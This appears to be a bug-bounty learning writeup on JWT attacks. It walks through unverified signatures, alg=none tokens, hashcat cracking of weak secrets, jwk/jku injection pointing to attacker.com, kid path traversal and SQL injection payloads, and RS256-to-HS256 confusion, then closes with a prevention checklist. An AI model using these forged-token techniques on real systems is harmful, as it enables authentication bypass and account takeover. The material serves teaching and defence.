---
layout: default
title: "Your New Writeup Title"
date: 2026-04-13
tags: [security, writeup, bugbounty, access-control]
author: "0x70da"
canonical_url: "https://0x70da.github.io/writeups/your-new-writeup.md"
excerpt: "Short description of the vulnerability."
---
<p style="text-align:left;">
  <a href="https://0x70da.github.io" title="Back to Home" style="font-size: 24px; text-decoration: none;">
    🏠Home
  </a>
</p>
---

## Introduction

## 1. What is JWT?

**JWT (JSON Web Token)** is an open standard (RFC 7519) for transmitting information between parties as a compact, self-contained token.

Before JWT existed, web applications used **session-based authentication**. Here is how that worked:

1. User sends username and password to the server
2. Server verifies the credentials
3. Server creates a session record in its database (or memory) and generates a random session ID
4. Server sends the session ID back to the client, usually in a `Set-Cookie` header
5. The client stores the session ID in a cookie
6. On every subsequent request, the browser automatically sends the cookie
7. The server receives the session ID, looks it up in the database, finds the user record, and knows who you are

The problem with this approach is **scalability**. If you have multiple servers behind a load balancer, server A created your session but server B has no idea who you are. You need a shared session store, which adds complexity and a single point of failure.

JWT solves this with a different idea: **instead of storing user state on the server, encode it directly into the token and give it to the client**. The server does not store anything. When the client sends the token back, the server just verifies the cryptographic signature to confirm the token is legitimate, then reads the user's information directly from the token. This is called **stateless authentication**.

### Where JWTs Appear

JWTs are commonly found in:

- `Authorization: Bearer <token>` header — most common in APIs and SPAs
- `Cookie: session=<token>` — used when the server wants automatic sending by the browser
- URL parameters — rare and insecure, avoid in practice

### What JWTs Are Used For

- **Authentication** — after login, the server issues a JWT that proves who you are. On every request, the server verifies it instead of querying a session store
- **Authorization** — the token carries claims like `"role": "admin"` or `"permissions": ["read", "write"]`. The server reads these claims directly from the token to decide what you can do
- **Information exchange** — two services can exchange verified information without a shared database, as long as they trust the same signing key

### The Core Security Promise

The fundamental promise of JWT is: *"I signed this data with my secret key. If you can verify the signature, the data was not tampered with after I signed it."*

This means:
- The server signs the token at login using a secret key only it knows
- If an attacker changes even one character in the token, the signature becomes invalid
- The server detects the mismatch and rejects the token

When that promise breaks — through implementation flaws — JWT becomes one of the most impactful attack surfaces in modern web applications, because a forged token can grant you any identity or privilege the application trusts.

---

## 2. JWT Structure Deep Dive

A JWT looks like this:

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIiLCJleHAiOjE3MDAwMDAwMDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

At first glance it looks like random text, but it has a precise structure. It consists of exactly **three parts separated by dots**:

```
<HEADER>.<PAYLOAD>.<SIGNATURE>
```

Each part is independently **Base64URL encoded**. Base64URL is a variant of Base64 that replaces `+` with `-` and `/` with `_`, and removes padding `=` characters, making it safe for use in URLs and HTTP headers.

---

### Part 1 — The Header

Take the first part of the token: `eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9`

Decode it from Base64URL and you get:

```json
{
  "alg": "RS256",
  "typ": "JWT"
}
```

The header is a JSON object that describes the token itself — its type and how it was signed. The fields are:

**`alg` (Algorithm)** — tells the server which algorithm was used to create the signature. This is critical: every JWT attack that involves forging a token must either match this algorithm or trick the server into accepting a different one. Common values:

| Value | Type | Description |
|-------|------|-------------|
| `HS256` | Symmetric | HMAC with SHA-256. Same key signs and verifies |
| `HS384` | Symmetric | HMAC with SHA-384 |
| `HS512` | Symmetric | HMAC with SHA-512 |
| `RS256` | Asymmetric | RSA signature with SHA-256. Private key signs, public key verifies |
| `ES256` | Asymmetric | ECDSA with SHA-256 |
| `none` | None | No signature. This is a major attack vector |

**`typ` (Type)** — almost always `"JWT"`. Tells parsers what kind of token this is.

**Optional header parameters** — these are less common but are the primary attack surface for advanced JWT attacks:

| Parameter | Full Name | Purpose |
|-----------|-----------|---------|
| `kid` | Key ID | Tells the server which key to use when multiple keys exist |
| `jwk` | JSON Web Key | Embeds the public key directly in the header |
| `jku` | JWK Set URL | A URL where the server should fetch the public key |
| `x5u` | X.509 URL | URL to an X.509 certificate chain |
| `x5c` | X.509 Chain | Embeds the certificate chain directly |

> ⚠️ The optional parameters `kid`, `jwk`, and `jku` are the most dangerous. If the server trusts attacker-controlled values in these fields without strict validation, it can be tricked into using an attacker-supplied key to verify the token.

---

### Part 2 — The Payload

Take the second part of the token: `eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIiLCJleHAiOjE3MDAwMDAwMDB9`

Decode it and you get:

```json
{
  "sub": "user123",
  "email": "user@example.com",
  "role": "user",
  "iat": 1516239022,
  "exp": 1700000000
}
```

The payload is a JSON object containing **claims** — statements about the user and the token. There are three categories:

**Registered claims** — standardized, defined in RFC 7519. Servers are expected to validate these:

| Claim | Meaning | Example |
|-------|---------|---------|
| `sub` | Subject — who this token is about (usually a user ID) | `"user123"` |
| `iss` | Issuer — which server created this token | `"https://auth.example.com"` |
| `aud` | Audience — which server this token is intended for | `"https://api.example.com"` |
| `exp` | Expiration — Unix timestamp after which the token is invalid | `1700000000` |
| `iat` | Issued at — Unix timestamp when the token was created | `1516239022` |
| `nbf` | Not before — Unix timestamp before which the token is invalid | `1516239022` |
| `jti` | JWT ID — unique identifier for this specific token | `"abc123"` |

**Public claims** — custom claims defined by the application, not standardized but registered with IANA to avoid collisions. Examples: `email`, `name`, `phone_number`.

**Private claims** — custom claims specific to the application, not registered anywhere. Examples: `role`, `department`, `tenant_id`. These are the most security-relevant because they often control authorization decisions.

> ⚠️ **Critical point that many developers misunderstand:** The payload is only **Base64URL encoded — not encrypted**. Anyone who has the token can decode it and read every claim in plain text. There is zero confidentiality. Never put passwords, secret keys, or any sensitive data in a JWT payload. If you need confidentiality, use JWE (JSON Web Encryption) instead.

You can verify this right now. Copy any JWT and paste it into [jwt.io](https://jwt.io) — you will see the payload immediately without needing any key.

---

### Part 3 — The Signature

The signature is the security mechanism that prevents tampering. It is **not** encoded JSON — it is a raw cryptographic value.

How it is created depends on the algorithm:

**For `HS256` (symmetric):**

```
signature = HMACSHA256(
  base64url(header) + "." + base64url(payload),
  secret_key
)
```

The server takes the raw text of `header.payload`, runs it through HMAC-SHA256 using the secret key, and that result is the signature. To verify a token, the server repeats the exact same operation and compares the result to the signature in the token. If they match, the token is valid.

The key insight: with HS256, **the same key both signs and verifies**. This means if an attacker learns the key, they can forge any token.

**For `RS256` (asymmetric):**

```
signature = RSASHA256(
  base64url(header) + "." + base64url(payload),
  private_key    ← used to sign (kept secret on the server)
)

verification = RSASHA256(
  base64url(header) + "." + base64url(payload),
  public_key     ← used to verify (can be shared publicly)
)
```

The server signs with the private key (which it never shares) and verifies with the public key (which anyone can have). This is the basis of the algorithm confusion attack: if the server can be made to use the public key as an HS256 secret, an attacker who knows the public key can forge tokens.

**What the signature actually protects:**

The signature covers `base64url(header) + "." + base64url(payload)`. If you change a single byte in either the header or the payload, the signature computed by the server will not match the signature in the token, and the server will reject it.

This is why every attack on JWT either:
1. Tricks the server into not checking the signature at all
2. Tricks the server into using a key the attacker controls
3. Gives the attacker the signing key so they can re-sign after modification

---

## 3. How JWT Authentication Works

```
┌──────────┐                          ┌──────────────┐
│  Client  │                          │    Server    │
└──────────┘                          └──────────────┘
     │                                       │
     │  POST /login {user, pass}             │
     │──────────────────────────────────────>│
     │                                       │ 1. Verify credentials
     │                                       │ 2. Generate JWT
     │                                       │    - Build header + payload
     │                                       │    - Sign with secret/private key
     │  200 OK + JWT token                   │
     │<──────────────────────────────────────│
     │                                       │
     │  GET /admin  [Authorization: Bearer JWT]
     │──────────────────────────────────────>│
     │                                       │ 1. Decode header
     │                                       │ 2. Re-compute signature
     │                                       │ 3. Compare signatures
     │                                       │ 4. Check claims (exp, iss, aud)
     │                                       │ 5. Extract role from payload
     │  200 OK or 403 Forbidden              │
     │<──────────────────────────────────────│
```

The security model depends entirely on steps 2–4 of the second request. Every JWT attack breaks one of those steps.

---

## 4. Attack 1 — Signature Not Verified

### Concept

Some servers decode the JWT to read its payload but **never actually verify the signature**. This means an attacker can modify any claim in the payload (e.g., change `"role": "user"` to `"role": "admin"`) and the server will accept it as legitimate, because it never checks if the signature is valid for the modified data.

### Why It Happens

JWT libraries typically offer two different functions:

- `decode(token)` — reads the header and payload, returns the data. Does **not** check the signature.
- `verify(token, key)` — reads the header and payload AND checks that the signature is valid. Rejects the token if anything was tampered with.

Developers sometimes use `decode()` when they should use `verify()`. The library does not throw an error — it just returns the payload without validating it.

Example in Node.js:

```javascript
// WRONG — reads payload but does not verify the signature
const payload = jwt.decode(token);

// CORRECT — verifies signature, throws if invalid
const payload = jwt.verify(token, secretKey);
```

The same mistake exists in Python, Go, and every other language. The function names differ but the concept is the same.

### Exploitation

**Step 1:** Log in to the application and capture your JWT from the `Authorization` header or cookie.

**Step 2:** Decode the payload. Paste it into [jwt.io](https://jwt.io) or use Burp's JWT Editor extension. You will see something like:

```json
{
  "sub": "user123",
  "role": "user",
  "exp": 1700000000
}
```

**Step 3:** Identify the claim that controls your privilege or identity. Common targets:
- `role` — change `"user"` to `"admin"` or `"administrator"`
- `sub` — change to another user's ID for horizontal privilege escalation
- `isAdmin` — change `false` to `true`
- `email` — change to another user's email if that is used as the identifier

**Step 4:** Modify the claim in Burp's JWT Editor. Do **not** change the signature — leave it exactly as it was (or fill it with random characters).

**Step 5:** Forward the modified request and observe whether the server accepts it.

If the server accepts a token with a completely invalid signature, it is not verifying at all.

### Impact

- Vertical privilege escalation — become an admin from a regular user account
- Horizontal privilege escalation — access another user's data by changing the `sub` claim
- Full authentication bypass in severe cases

---

## 5. Attack 2 — Accepting the `none` Algorithm

### Concept

The JWT specification defines a special algorithm value: `"alg": "none"`. It means the token is intentionally unsigned — no signature is needed and no verification should be performed. It was designed for cases where integrity is guaranteed by other means (e.g., a direct TLS connection between trusted services).

The problem: many JWT libraries implement support for `none` and some servers do not explicitly disable it. An attacker can change the `alg` to `none`, strip the signature, modify the payload freely, and the server accepts it.

### Why It Exists

Legacy JWT libraries, especially early versions, defaulted to accepting `none` for backward compatibility and ease of development. Modern libraries disable it by default, but developers must explicitly configure this. If they do not, the door stays open.

### Exploitation

**Step 1:** Capture your JWT from a normal authenticated request. Decode the header:

```json
{ "alg": "RS256", "typ": "JWT" }
```

**Step 2:** Change the `alg` value to `none`:

```json
{ "alg": "none", "typ": "JWT" }
```

**Step 3:** Modify the payload as desired. For example, escalate your role:

```json
{ "sub": "user123", "role": "administrator", "exp": 1700000000 }
```

**Step 4:** Base64URL-encode the new header and the modified payload separately. Concatenate them with a dot. Add a **trailing dot** but no signature after it:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6ImFkbWluaXN0cmF0b3IifQ.
```

The trailing dot is required because the JWT format always expects three parts. The third part is just empty.

**Step 5:** Replace the original token with your crafted token and send the request.

### Bypass Variants

If the server does a string check for `"none"` and rejects it, try case variations. Many implementations do a case-sensitive equality check:

| Variant | Value |
|---------|-------|
| Uppercase | `NONE` |
| Mixed case | `nOnE`, `None` |
| With whitespace | `"none "` |
| With null byte | `"none\x00"` |

---

## 6. Attack 3 — Weak Secret Key / Brute Force

### Concept

When a server uses `HS256` (or any HMAC variant), the same secret key both signs and verifies the token. If that key is short, guessable, or a known default value, an attacker can brute-force it offline and then forge any token they want.

### Why Offline Brute Force is Dangerous

Unlike password brute-forcing against a login form, JWT brute-forcing is **completely offline**. You only need the token. There are no requests to the server, no rate limiting, no account lockouts, no IP blocks. You run the attack at full GPU speed against a local file.

The attacker's process:

1. Capture a valid JWT from any request
2. Run hashcat or jwt_tool against it with a wordlist
3. If the secret is weak, it cracks in seconds to minutes
4. Use the cracked secret to sign forged tokens with any payload

### How Brute Forcing Works

HMAC verification is deterministic. Given the same key, `HMACSHA256(header.payload, key)` always produces the same result. The attacker tries every key in a wordlist, computes the HMAC, and checks if it matches the signature in the token.

**hashcat** (fastest, GPU-accelerated):

```bash
hashcat -a 0 -m 16500 <your_jwt> /usr/share/wordlists/rockyou.txt
```

`-m 16500` is the hashcat mode for JWT (HMAC-SHA256). The full JWT is passed as the hash target because hashcat knows how to parse it.

**jwt_tool:**

```bash
python3 jwt_tool.py <your_jwt> -C -d /usr/share/wordlists/rockyou.txt
```

**john:**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt.txt
```

### Common Weak Keys Found in the Wild

- `secret`
- `password`
- `your-256-bit-secret` — literally from the jwt.io documentation example
- `changeme`
- The application name itself (e.g., `wordpress`, `myapp`)
- Empty string `""`
- `1234567890`
- `supersecret`

### Exploitation After Cracking

Once you have the secret key, you can sign any token you want.

**Step 1:** Craft your desired payload:

```json
{
  "sub": "administrator",
  "role": "admin",
  "exp": 9999999999
}
```

**Step 2:** Sign it with the cracked key in Python:

```python
import jwt

payload = {"sub": "administrator", "role": "admin", "exp": 9999999999}
token = jwt.encode(payload, "cracked_secret", algorithm="HS256")
print(token)
```

**Step 3:** Alternatively, in Burp JWT Editor — paste the cracked key into the key field, modify the payload in the editor, click "Sign". The extension handles the signing for you.

**Step 4:** Use the newly signed token in your requests.

### Key Disclosure via Recon

Sometimes the key is not cracked but **leaked** through recon:

1. Hardcoded in source code on a public GitHub repository
2. In `.env` files that were accidentally committed
3. In error messages or stack traces that reveal configuration values
4. In JavaScript bundles (some frameworks embed server-side config in client bundles)
5. In Docker images published to Docker Hub
6. In CI/CD configuration files (`.travis.yml`, `Jenkinsfile`, GitHub Actions)

Useful GitHub search queries for bug bounty:

```
org:target-company JWT_SECRET
org:target-company jwt secret
filename:.env JWT
repo:target-company/app-name signing_key
```

---

## 7. Attack 4 — `jwk` Header Parameter Injection

### Concept

The `jwk` (JSON Web Key) header parameter was designed to allow a JWT to carry the public key needed to verify its own signature — embedding it directly inside the token header as a JSON object. The intended use case is for systems where the verifier does not already have the public key and needs it delivered with the token.

The vulnerability: if a server reads the `jwk` parameter from the token header and uses that key for verification **without checking it against a trusted whitelist**, an attacker can embed their own public key in the header and sign the token with the corresponding private key. The server then uses the attacker's public key to verify the signature — and it will succeed, because the attacker signed it correctly with their own key.

### The Circular Trust Problem

The normal trust model: **the server already knows which keys are trusted**. The token claims an identity, and the server verifies it using a key it already possesses.

When a server trusts the `jwk` embedded in the token, the trust model inverts: **the token tells the server which key to trust**. This means the attacker controls both the key and the data being signed with it.

```
Secure:      Attacker changes payload → Signature invalid → Server rejects
Vulnerable:  Attacker changes payload + injects own public key → Signature valid → Server accepts
```

### Exploitation

**Step 1:** In Burp Suite, open the JWT Editor extension. Go to the **"JWT Editor Keys"** tab and click **"New RSA Key"**. Click **"Generate"** to create a fresh RSA key pair. Save it.

**Step 2:** Go back to the Repeater tab where you have a captured authenticated request. Click on the **"JSON Web Token"** tab that the extension adds.

**Step 3:** Modify the payload to your desired values. For example, change `"role": "user"` to `"role": "administrator"`.

**Step 4:** Click **"Attack"** and select **"Embedded JWK"**. Select the RSA key you generated in Step 1.

The extension will automatically:
- Add a `jwk` parameter to the token header containing your public key in JWK format
- Sign the entire token with your private key

**Step 5:** Send the request. If the server extracts the `jwk` from the header and uses it for verification without validating it against a trusted key store, the attack succeeds.

### What the Injected Header Looks Like

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "kid": "attacker-key-1",
    "n": "<attacker_public_key_modulus_base64url>"
  }
}
```

The `n` field is the RSA public key modulus. The server uses this to verify the signature, which the attacker created with the matching private key.

---

## 8. Attack 5 — `jku` Header Parameter Injection

### Concept

The `jku` (JWK Set URL) header parameter tells the server where to fetch the public key(s) needed to verify the token. Instead of embedding the key directly in the header like `jwk`, it provides a URL to a JWKS (JSON Web Key Set) endpoint. The server makes an outbound HTTP request to that URL, retrieves the key, and uses it for verification.

The vulnerability: if the server fetches from any URL specified in the `jku` parameter without validating that the URL belongs to a trusted domain, an attacker can host their own JWKS on a server they control and point the `jku` to it.

### Exploitation

**Step 1:** In Burp JWT Editor, generate a new RSA key pair.

**Step 2:** Copy your public key in JWK format from the extension. Create a JWKS file on a server you control:

```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "attacker-kid-1",
      "n": "<your_public_key_modulus_base64url>"
    }
  ]
}
```

Host this file at a publicly accessible URL, for example:
`https://attacker.com/.well-known/jwks.json`

In a lab environment, Burp Collaborator serves this purpose — you can host files there temporarily.

**Step 3:** Modify the JWT header to include the `jku` parameter pointing to your server, and set the `kid` to match the key ID in your hosted JWKS:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "attacker-kid-1",
  "jku": "https://attacker.com/.well-known/jwks.json"
}
```

**Step 4:** Modify the payload to your desired values (escalate role, change user ID, etc.).

**Step 5:** Sign the token with your private key using the JWT Editor. The `kid` in the header must match the `kid` in your hosted JWKS so the server selects the right key.

**Step 6:** Send the request. The server fetches your JWKS, finds the key with the matching `kid`, verifies the signature (which is valid, because you signed it with your key), and accepts the modified payload.

### Bypass — When `jku` Whitelist is Partial

A server might not accept arbitrary URLs but may check only that the `jku` *starts with* or *contains* a trusted domain. This can often be bypassed:

| Bypass Type | Example |
|-------------|---------|
| Subdomain spoofing | `https://trusted.com.attacker.com/jwks.json` |
| Path confusion | `https://trusted.com/path?x=https://attacker.com/jwks.json` |
| Fragment injection | `https://trusted.com#.attacker.com/jwks.json` |
| Open redirect chain | `https://trusted.com/redirect?url=https://attacker.com/jwks.json` |

The correct defense is a strict **allowlist** of trusted URLs, not a contains/startsWith check.

---

## 9. Attack 6 — `kid` Header Parameter Injection

### Concept

The `kid` (Key ID) parameter in the JWT header is used to identify **which key** the server should use when it manages multiple signing keys. For example, a server might rotate keys periodically and keep several active at once. The `kid` tells it which one to use for verification.

The server takes the `kid` value and uses it to look up the key. Depending on the implementation, this lookup might be done against:
- A filesystem (the `kid` is used as a filename or path component)
- A database (the `kid` is used in a query)
- An in-memory key store

Both the filesystem and database lookups create injection opportunities if the `kid` value is not sanitized.

### 9.1 — Path Traversal via `kid`

If the server uses the `kid` value to construct a file path and load the key:

```python
# Vulnerable server-side code
with open(f"/var/keys/{kid}") as f:
    signing_key = f.read()
```

The `kid` is controlled by the attacker (it is in the JWT header). If the server does not sanitize it, path traversal sequences like `../` can be used to point to an arbitrary file on the server's filesystem.

**The goal:** find a file whose contents are **known or predictable**, use that as the signing key, and sign your modified JWT with that same key.

**The classic target: `/dev/null`**

`/dev/null` on Linux is a special file that is always empty — reading it always returns an empty string. If you point `kid` to `/dev/null`, the server reads an empty signing key. You then sign your forged token with an empty string as the key.

**Step 1:** Modify the JWT header to use path traversal in the `kid` field:

```json
{ "kid": "../../../dev/null", "alg": "HS256" }
```

Note: adjust the number of `../` sequences depending on how deep the keys directory is.

**Step 2:** Modify the payload as desired.

**Step 3:** Sign the JWT with an empty string as the HMAC secret:

```python
import jwt

payload = {"sub": "administrator", "role": "admin"}
token = jwt.encode(payload, "", algorithm="HS256")
print(token)
```

Or in Burp JWT Editor: create a new Symmetric Key, set the `k` value to the Base64URL encoding of an empty string, then sign.

**Step 4:** Send the request.

Other predictable files you can target:

- `/proc/sys/kernel/randomize_va_space` — typically contains `2` on most Linux systems
- Any world-readable file whose content you know from the application's source code
- `/etc/hostname` — if you know the server's hostname

### 9.2 — SQL Injection via `kid`

If the server queries a database to retrieve the signing key:

```sql
-- Vulnerable query inside the server
SELECT key_value FROM signing_keys WHERE kid = '<kid_from_header>';
```

If the `kid` value is inserted directly into the query without parameterization, it is vulnerable to SQL injection.

**The goal:** inject a `UNION SELECT` that makes the query return a value you control — then sign the JWT with that same value.

**Step 1:** Craft a `kid` payload that injects a UNION SELECT returning a known string:

```json
{ "kid": "anything' UNION SELECT 'mysecretkey' --", "alg": "HS256" }
```

The resulting SQL query becomes:

```sql
SELECT key_value FROM signing_keys WHERE kid = 'anything' UNION SELECT 'mysecretkey' --';
```

This returns `mysecretkey` as the signing key.

**Step 2:** Modify the payload.

**Step 3:** Sign the JWT using `mysecretkey` as the HMAC secret.

**Step 4:** Send the request. The server runs the injected query, gets `mysecretkey`, verifies the signature (which matches), and accepts the token.

---

## 10. Attack 7 — Algorithm Confusion (RS256 → HS256)

### Concept

This is one of the most technically elegant JWT attacks. It exploits a fundamental difference between how RS256 and HS256 handle keys.

| Algorithm | Signing Key | Verification Key |
|-----------|------------|-----------------|
| RS256 (asymmetric) | Private key — kept secret | Public key — shared openly |
| HS256 (symmetric) | Secret key | Same secret key |

The attack works as follows: if a server uses RS256 but its verification code can also accept HS256 (i.e., it trusts the `alg` value from the token header), an attacker can:

1. Obtain the server's **RSA public key** — this is not a secret; it is meant to be public
2. Change the `alg` in the JWT header from `RS256` to `HS256`
3. Use the RSA public key as the HMAC secret to sign the modified token
4. Send the token to the server

The server reads `"alg": "HS256"` from the header, switches to HMAC verification, and uses its RSA public key as the HMAC secret (because that is the key it has available). Since the attacker also used the public key as the HMAC secret, the signature matches. The server accepts the forged token.

### Why This Works

The confused server performs:

```
expected_signature = HMACSHA256(header.payload, rsa_public_key)
```

The attacker also computed:

```
attacker_signature = HMACSHA256(header.payload, rsa_public_key)
```

They are identical. The server sees a valid signature and accepts the token.

The root cause: the server trusts the `alg` claim in the token header and switches verification algorithm based on it, rather than having the algorithm hardcoded on the server side.

### Exploitation — Public Key is Exposed

**Step 1:** Find the server's RSA public key. Common locations:
- `/.well-known/jwks.json`
- `/oauth/jwks`
- `/api/v1/jwks`
- The application's GitHub repository
- Response headers on certain endpoints

**Step 2:** Extract the public key in PEM format. If you have it in JWK format (from a JWKS endpoint), convert it to PEM. Burp's JWT Editor can do this — import the JWK and export as PEM.

**Step 3:** Convert the PEM to Base64 to use as the symmetric key secret:

```bash
cat public_key.pem | base64 | tr -d '\n'
```

**Step 4:** In Burp JWT Editor, create a **New Symmetric Key**. Paste the Base64-encoded PEM into the `k` field. Save the key.

**Step 5:** In your captured JWT, change the `alg` in the header from `RS256` to `HS256`.

**Step 6:** Modify the payload (change role, user ID, etc.).

**Step 7:** In the JWT Editor, sign the token using the symmetric key you created in Step 4.

**Step 8:** Send the request.

### Exploitation — Public Key is Not Exposed

If the public key is not available anywhere, you can **derive it** from two valid JWT tokens signed by the same private key. This is possible because two RSA signatures made with the same private key contain enough mathematical information to recover the public key.

**Step 1:** Log in as a normal user and capture two different JWT tokens. They must be signed by the same key (same `kid` if present).

**Step 2:** Run PortSwigger's key derivation tool:

```bash
docker run --rm -it portswigger/sig2n <token1> <token2>
```

This outputs several candidate public keys in both JWK and PEM format.

**Step 3:** For each candidate key, create a symmetric key in Burp JWT Editor (as in the exposed-key scenario), sign a test token, and send it to the server.

**Step 4:** The correct candidate key will produce a token that the server accepts (200 response). Use that key to sign your actual forged token with the privilege-escalation payload.

### Root Cause in Code

```python
# VULNERABLE — algorithm taken from token header, attacker controls it
algorithm = jwt.get_unverified_header(token)["alg"]
jwt.decode(token, public_key, algorithms=[algorithm])

# SECURE — algorithm hardcoded on the server, token header value is irrelevant
jwt.decode(token, public_key, algorithms=["RS256"])
```

The fix is a single line change. The algorithm must never come from user-controlled input.

---

## 11. Claims Validation Vulnerabilities

Even with a perfectly valid and correctly verified signature, JWT security depends on **claims validation**. A server that skips these checks is vulnerable even if the signature is verified correctly.

### Missing Expiration Check (`exp`)

If the server verifies the signature but never checks the `exp` claim, tokens are valid forever. A token stolen a year ago still grants access.

**Test:** Decode your JWT, change the `exp` value to `1` (a timestamp in 1970 — long expired), re-sign it, and send it. If the server accepts an expired token, `exp` is not checked.

**Real-world impact:** Stolen tokens — from XSS, network interception, database leaks, or log files — remain valid indefinitely. There is no natural expiry that limits the damage window.

### Missing Issuer Check (`iss`)

If multiple services within an organization use JWTs signed by the same key but different issuers, a token issued for Service A may be accepted by Service B.

**Test:** Capture a token from one service. Modify the `iss` claim to match another service's identifier. If the second service accepts it, `iss` is not validated.

**Example scenario:** An internal admin dashboard and a public API both use the same signing key. A user token from the public API, with `iss` changed to the admin dashboard's issuer, could grant admin access.

### Missing Audience Check (`aud`)

The `aud` claim specifies which service the token is intended for. Without this check, a token issued for one service works on any other service using the same key.

**Test:** Modify the `aud` claim and check if the service still accepts the token.

### `nbf` Not Checked

The "not before" claim restricts tokens from being used before a certain time. Rarely a direct attack vector in isolation, but its absence can be combined with other issues such as pre-issued tokens used before they should be valid.

### Claims Confusion via Duplicate Keys

Some JSON parsers allow duplicate keys in a JSON object. If the payload contains two `role` fields:

```json
{
  "sub": "user123",
  "role": "user",
  "role": "administrator"
}
```

Different parsers handle this differently. If the JWT library uses the first occurrence but the authorization logic uses the last occurrence (or vice versa), injecting a second claim can bypass authorization.

---

## 12. JWT in the Real World — What to Hunt

### Recon Checklist

1. Capture all JWTs from the login flow — check both cookies and `Authorization` headers
2. Decode every JWT at jwt.io — note the `alg`, every header parameter, and every payload claim
3. Check whether `kid`, `jwk`, `jku`, or `x5u` parameters appear in the header
4. Look for a JWKS endpoint: `/.well-known/jwks.json`, `/oauth/jwks`, `/api/keys`, `/api/v1/jwks`
5. Search the target's GitHub organization for JWT secrets using the queries in Attack 3 above
6. Check JavaScript bundles for hardcoded keys or configuration values

### Quick Triage Flow

```
Got a JWT?
  │
  ├─ Change role/sub in payload, keep old signature ──→ Server accepts? → Sig not verified
  │
  ├─ Set alg=none, remove signature ──────────────────→ Server accepts? → None attack
  │
  ├─ Is alg=HS256? → Run hashcat on it ───────────────→ Cracked? → Weak key
  │
  ├─ Is alg=RS256? → Look for public key ─────────────→ Found? → Algorithm confusion
  │
  ├─ Is there a kid param? → Test path traversal ─────→ Works? → kid injection
  │
  └─ Is there a jku/jwk param? → Test injection ──────→ Works? → Header injection
```

---

## 13. Prevention Checklist

For developers fixing JWT implementations:

1. **Always verify the signature** — never use `decode()` when you need `verify()`
2. **Never trust the `alg` from the token header** — hardcode the expected algorithm on the server side
3. **Explicitly disable the `none` algorithm** in your JWT library configuration
4. **Validate all registered claims** — `exp`, `iss`, `aud`, `nbf` must all be checked
5. **Use a strong, random secret key** for HMAC — minimum 256 bits, generated with a cryptographically secure random number generator (CSPRNG)
6. **Whitelist allowed `jku` URLs strictly** — never fetch from arbitrary URLs; use exact match, not contains/startsWith
7. **Never trust keys from the `jwk` header parameter** — maintain a server-side trusted key store and ignore any keys embedded in the token
8. **Sanitize the `kid` parameter** — prevent path traversal sequences and SQL injection
9. **Never use the RSA public key as an HMAC secret** in any code path
10. **Rotate signing keys periodically** and provide a mechanism to revoke compromised keys
11. **Use short expiration times** on access tokens — supplement with refresh token rotation for long-lived sessions
12. **Use up-to-date JWT libraries** — many older versions have known vulnerabilities in their algorithm handling
13. **Never store sensitive data in the JWT payload** — it is Base64 encoded, not encrypted; anyone with the token can read it

---

*Written as part of a structured penetration testing learning path. All techniques practiced in authorized lab environments (PortSwigger Web Security Academy) and applied to authorized bug bounty programs.*
...
